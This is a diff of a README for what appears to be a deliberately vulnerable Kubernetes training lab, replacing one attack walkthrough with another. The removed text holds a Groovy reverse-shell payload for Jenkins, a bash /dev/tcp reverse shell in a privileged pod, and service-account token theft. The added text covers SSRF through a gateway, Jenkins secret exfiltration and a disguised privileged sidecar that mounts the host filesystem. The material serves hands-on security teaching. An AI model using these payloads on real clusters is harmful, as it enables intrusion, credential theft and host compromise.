@@ -1,293 +1,201 @@
-# Arrrspace
+# Getting Setup
 
-Welcome to Arrrspace, your digital home away from home.
-
-Arrrspace is a super modern social media platform that's transforming the
-way people think.
-
-## TODO More orwellian big brothery type commentary
-
-## TODO Signing up for Arrrspace
-
-# API Attack Guide
-
-## Using Postman + BurpSuite
-
-### Proxying Postman through BurpSuite
-
-### Walking the hAPI Path
-
-TODO: tips on how to enumerate / map an api with postman
-
-### Retracing Your Step
-
-TODO: tips on what to look for in BurpSuite
-
-### Nobody Like Policy
-
-TODO: CORS stuff?
-
-### Things are Starting to Get Fuzzy
-
-TODO: API fuzzing
-
-### I Left my ID in My Other Pants (I swear)
-
-TODO: Authorization / authentication stuff
-
-### Crossing the Border...
-
-TODO: CSRF
-
-# Cluster Attack Guide
-
-## Through the Gates
-
-Now that we know about the fact that the API gateway will actually forward our request
-to any host, we can do some recon. We'll focus on trying to enumerate some k8s services.
-
-1. In burp find a request to the gateway and send it to intruder with Ctrl-I.
-2. Click remove to remove all the pesky auto places section markers.
-3. Highlight the value of the `Host` header and click add markers.
-4. In the payloads tab of intruder click load and select the `wordlist` file.
-5. Click attack.
-
-## Down with Jenkins
-
-Since we have now figured out that there is a jenkins service running in the cluster and
-we can send requests to it by way of the API gateway, we might try attacking it.
-
-Motivations for doing this. Jenkins in a cluster implies that there is a CI/CD pipeline.
-This implies that the Jenkins service may have high enough permissions in the cluster to at
-least view and deploy pods. Also, it's Jenkins, it's an easy target :)
-
-Let's try getting a reverse shell with some Groovy code. By default some Jenkins installs have
-the `/scriptText` endpoint enabled which allows for the execution of Groovy code remotely. As an
-attacker that's... Groovy!
-
-### Start a netcat listener on your attack machine
-
+## Start the cluster
 ```
-ncat -lvp <port>
+kind delete cluster
+./setup.sh
 ```
 
-TODO: Sample Request to execute Groovy reverse shell
-
+## Check the deployment status
 ```
-POST / HTTP/1.1
-Host: https://jenkinssvc:8080/scriptText
-
-script=String host="172.17.0.1";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+kubectl get pods
 ```
 
-Once the reverse shell connects to your listener we will need to get `enum4k8s` into the
-compromised jenkins pod.
+You can hit the externally facing API gateway hitting `http://localhost:31337/api`.
 
-We can do this by starting a python http server in the `enum4k8s` dir.
+For example `curl http://localhost:31337/api`.
 
-In a new terminal window:
+# Exploit an SSRF flaw in the gateway
+*ps there is actually another way to gain access to the jenkins instance. see if you can figure it out*
 
-```
-cd /path/to/enum4k8s
-python -m http.server 4444
-```
+## Discover the HTTP headers that trigger a different behavior from the gateway
 
-Now back in your reverse shell:
+You can do this with pretty much any tool you like, but we're going to use ffuf because it's 1337 and fast. This command will fuzz for headers using a list from seclists. It will match against some interesting response status codes. Additionally, it will save the request-response pairs to the directory `req_res` so that you can examine them for interesting response bodies.
 
 ```
-wget http://<attack-machine-ip>:4444/build/static/enum4k8s
-chmod +x enum4k8s
+ffuf -w /opt/samurai/wordlists/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers:FUZZ -u http://localhost:31337/api -H "FUZZ: foo" -c -mc 200,403,500,503 -od req_res
 ```
 
-Let's look for Jenkins' secret >:)
+You can also proxy the traffic from ffuf through BurpSuite if you want using `-x 127.0.0.1:8080`
 
-In the reverse shell:
-
-```
-ls /var/run/secrets/kubernetes.io/serviceaccount/
-export t=`cat /var/run/secrets/kubernetes.io/serviceaccount/token
-```
-
-Now let's enumerate the k8s API with our newly found token!
-
-Again in the reverse shell:
+When we discover a HTTP header that gives us an interesting response such as a 500, we can then fuzz the value of said header.
 
 ```
-./enum4k8s -jwt $t | tee api_enum
+ffuf -w k8s-labs/payloads/wordlist -u http://localhost:31337/ -H "X-Original-Host: http://FUZZ:8080" -c -od req_res -x 127.0.0.1:8080
 ```
 
-Zowee, that's a lot of info!
+For this one we are looking for indications that the backend is trying to resolve the values to IP addresses. So, for example if we get an error message that seems to indicate that it failed to resolve, then we know that value is not a viable SSRF target. However, if a value causes a timeout, or possibly a different error, then we can guess that it might likely be a viable target, for which we would need to then try to guess a port number for.
 
-Let's get some more!
-
+## Hit the jenkins service through SSRF
 ```
-./enum4k8s -jwt $t -dump | tee api_enum_dump
-```
-
-Wow, that's even MORE info!
-
-Let's look through it for a bit and see if there is anything interesting in there.
-
-Looks like there is another account worth trying to grab
-
-```
-grep -C 10 "admin" api_enum_dump
+curl http://localhost:31337 -H "X-Original-Host: http://jenkinssvc:8080"
 ```
 
-Looks like we've got ourselves a poorly configure default namespace admin token!
-Let's see what they're account can do :D
+We should see a resonse which is the Jenkins dashboard comeback. Indicating that we were able to hit a internal Jenkins service via the API gateway SSRF.
 
+# Exploit the access to Jenkins
+To do this we can use the raw HTTP request which is found in the file `k8s-labs/payloads/jenkinsexploit.http`. This is just a convenience to exploit the `scriptText` endpoint which Jenkins has enabled by default. This particular payload will exfiltrate the Jenkins containers kubernetes secret for us, which we can then use with `kubectl` to further expand our access to the cluster.
+
+You could also use a different Groovy payload here, such as a reverse shell to gain a shell into the Jenkins container, and go from there. Try it out!
+
+## Use the stolen kubernetes service account token to do sidecar injection
+This is pretty much the final step. We can check and see what the stolen service account token allows us to do, and the abuse it's capabilities to inject a sneaky sidecar container that allows us to escape to the host node.
+
+Set the token as an env var in your terminal.
 ```
-export at=<base64 decoded token>
-./enum4k8s -jwt $at -dump | tee api_enum_dump_default_admin
-```
-
-So, the admin has a lot of access within the default namespace, that makes sense.
-
-For the next part we can use either token, as both have the ability to create resources with the
-`/api/v1/namespaces/default/pods` endpoint.
-
-Let's create a malicious pod spec!
-
-First open yet another terminal and create another netcat listener on a different port than the first.
-
-```
-ncat -lvp 6666
+export JWT="<jwt value here>"
 ```
 
-In the reverse shell:
-
+Check it's capabilities.
 ```
-./enum4k8s -pod -name "evil" -cmd '["bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/6666 0>&1"]' -img "ubuntu:trusty" > pod.json
-```
-
-That should have generate a file with the following contents:
-
-```json
-{
-  "apiVersion": "v1",
-  "kind": "Pod",
-  "metadata": {"name": "evil"},
-  "spec": {
-    "containers": [
-      {
-        "name": "evil",
-        "image": "ubuntu:trusty",
-        "command": [
-          "bash",
-          "-c",
-          "bash -i >& /dev/tcp/<attack-machine-ip>/<port> 0>&1"
-        ],
-        "securityContext": {
-          "privileged": true
-        },
-        "volumeMounts": [
-          {
-            "mountPath": "/mnt/host",
-            "name": "hostvolume",
-            "mountPropagation": "Bidirectional"
-          }
-        ]
-      }
-    ],
-    "volumes": [
-      {
-        "name": "hostvolume",
-        "hostPath": {
-          "path": "/"
-        }
-      }
-    ]
-  }
-}
+kubectl --token=$JWT auth can-i --list
 ```
 
-When we apply that pod spec to the k8s API, it should create a pod that upon startup connects a bash reverse shell back to our netcat listener. This spec also tells k8s to create a bidirectional bind mount of the host systems `/` dir to `/mnt/host` within the container. Nifty!
-
-Of course this stuff would only work if the cluster is configured to allow unsafe things such as bidirectional volume mounts, privileged security context, and network egress to non-whitelisted IPs.
-
-Next we need a way to tell the k8s API to create the pod. There are a few ways we can do this.
-
-Using curl. This can get pretty janky when you have too many non-tty reverse shells going on and such.
+Inject a side-car container to the jenkins service which looks like a logging sidecar.
 
 ```
-curl -k -H "Authorization: Bearer $t" \
-  -H "Content-Type: application/json" \
-  -d "$(cat pod.json)" -XPOST https://kubernetes/api/v1/namespaces/default/pods
+kubectl --token=$JWT edit deployment jenkinssvc
 ```
 
-Or my preferred way... Compress kubectl and infiltrate it into the pod!
-
-If it's already on your system then just make a copy of it and skip the next command.
-
-```bash
-curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
-```
-
-Let's compress and encode the kubectl binary:
-
-```bash
-mkdir kube
-mv kubectl kube/kube
-tar -zcvf kube.tar.gz kube
-cat kube.tar.gz | base64 > kube.tar.gz.b64
-```
-
-Now serve the file up:
-
-```bash
-python -m SimpleHTTPServer [PORT]
-```
-
-Back in the compromised struts pod
-Get the kubectl payload
-
-```bash
-curl http://<ATTACK_IP:PORT>/kube.tar.gz.b64
-```
-
-decode and extract the binary
-
-```bash
-cat kube.tar.gz.b64 | base64 -d > kube.tar.gz
-tar -xjvf kube.tar.gz
-mv kubectl_payload/kubectl ./kube
-```
-
-make it executable
+We want to edit the deployment to look like the deployment spec below.
+The regions that are updates are surrouned with the following string
 
 ```
-chmod +x ./kube
+# ===================================
 ```
 
-Now let's test it out with out freshly stolen JWT :)
+### Modifed Spec
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  annotations:
+    deployment.kubernetes.io/revision: "2"
+  creationTimestamp: "2023-11-01T18:33:36Z"
+  generation: 2
+  labels:
+    app: jenkinssvc
+  name: jenkinssvc
+  namespace: default
+  resourceVersion: "12117"
+  uid: 58eedc88-93f6-4030-9534-0e9b875abba4
+spec:
+  progressDeadlineSeconds: 600
+  replicas: 1
+  revisionHistoryLimit: 10
+  selector:
+    matchLabels:
+      app: jenkinssvc
+  strategy:
+    rollingUpdate:
+      maxSurge: 25%
+      maxUnavailable: 25%
+    type: RollingUpdate
+  template:
+    metadata:
+      creationTimestamp: null
+      labels:
+        app: jenkinssvc
+    spec:
+      containers:
+      # ===================================
+      - command:
+        - sleep
+        - infinity
+        image: k8s-labs-base:v1
+        imagePullPolicy: IfNotPresent
+        name: jenkins-logging-sidecar
+        resources: {}
+        securityContext:
+          privileged: true
+        terminationMessagePath: /dev/termination-log
+        terminationMessagePolicy: File
+        volumeMounts:
+        - mountPath: /mnt
+          mountPropagation: Bidirectional
+          name: log-volume
+      # ===================================
+      - env:
+        - name: JAVA_OPTS
+          value: -Djenkins.install.runSetupWizard=false
+        image: k8s-labs-jenkinssvc:v1
+        imagePullPolicy: IfNotPresent
+        name: jenkinssvc
+        ports:
+        - containerPort: 8080
+          name: http-port
+          protocol: TCP
+        - containerPort: 50000
+          name: jnlp-port
+          protocol: TCP
+        resources: {}
+        terminationMessagePath: /dev/termination-log
+        terminationMessagePolicy: File
+        volumeMounts:
+        - mountPath: /var/jenkins_home
+          name: jenkins-home
+      dnsPolicy: ClusterFirst
+      restartPolicy: Always
+      schedulerName: default-scheduler
+      securityContext: {}
+      serviceAccount: deploy-manager-sa
+      serviceAccountName: deploy-manager-sa
+      terminationGracePeriodSeconds: 30
+      volumes:
+      # ===================================
+      - hostPath:
+          path: /
+          type: ""
+        name: log-volume
+      # ===================================
+      - emptyDir: {}
+        name: jenkins-home
+status:
+  availableReplicas: 1
+  conditions:
+  - lastTransitionTime: "2023-11-01T18:33:39Z"
+    lastUpdateTime: "2023-11-01T18:33:39Z"
+    message: Deployment has minimum availability.
+    reason: MinimumReplicasAvailable
+    status: "True"
+    type: Available
+  - lastTransitionTime: "2023-11-01T18:33:36Z"
+    lastUpdateTime: "2023-11-01T19:12:33Z"
+    message: ReplicaSet "jenkinssvc-7ddbf46c7f" has successfully progressed.
+    reason: NewReplicaSetAvailable
+    status: "True"
+    type: Progressing
+  observedGeneration: 2
+  readyReplicas: 1
+  replicas: 1
+  updatedReplicas: 1
+```
+
+Once that successfully updates we can exec into our new container.
 
 ```
-./kube --token=$t get pods
+kubectl --token=$JWT exec jenkinssvc-<hash_here> -it --container jenkins-logging-sidecar -- /bin/bash
 ```
 
-Alright, let's create that evil pod!
+Once we have the shell in the sidecar container we can modify the host node filesystem by writing a flag to `/mnt/flag.txt`. 
 
-```bash
-./kube --token$t apply -f pod.json
+You can check the file was created on the node filesystem with the following command in another terminal.
+
+```
+docker exec kind-control-plane -- ls /flag.txt
 ```
 
-TODO: talk about how the pod is now created
+## That's it!
 
-After a few seconds or so, if all went well, you should see a connection to your netcat listener.
-
-In that reverse shell we can do the following to show that we've pwned the node itself!
-
-```bash
-cat /mnt/host/etc/shadow
-touch /mnt/host/etc/pwned
-```
-
-Now back on your hostin / attack machine hop into our "node" container.
-
-```bash
-docker exce -it arrrspace-control-plane /bin/bash
-ls /etc/
-```
-
-If you see the `pwned` file then it worked! I will leave gaining persistence on the node as an excersise to the reader ;)
+You are of course free to tinker further, but that demonstrates the ability to compromise the host node using a bidirectional volume mount from within a sidecar container!
